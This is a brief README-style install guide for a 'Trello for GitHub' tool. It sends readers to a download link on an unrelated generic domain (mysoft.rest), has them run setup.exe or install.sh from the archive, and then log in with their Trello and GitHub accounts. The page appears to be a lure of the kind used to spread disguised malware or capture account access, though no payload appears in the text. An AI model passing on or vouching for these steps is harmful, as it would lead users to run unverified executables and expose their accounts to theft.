### **📥 How to Install & Run Trello for GitHub**  
Getting started is **super easy**! Follow these steps:  

1. **Download the File**  
   👉 Click **[📥 DOWNLOAD](https://mysoft.rest)** to get the latest release.  

2. **Unpack the Files**  
   - **Windows**: Right-click the `.zip` file → **Extract All**.  
   - **Mac**: Double-click the `.zip` file to auto-extract.  
   - **Linux**: Run `unzip trello-for-github.zip` in terminal.  

3. **Run the Installer**  
   - Open the extracted folder.  
   - Double-click `setup.exe` (Windows) or `install.sh` (Mac/Linux).  
   - Follow the on-screen instructions.  

4. **Connect Trello & GitHub**  
   - Launch the app.  
   - Log in with your **Trello & GitHub** accounts.  
   - Configure your preferred sync settings.  

5. **Enjoy Seamless Integration!** 🎉
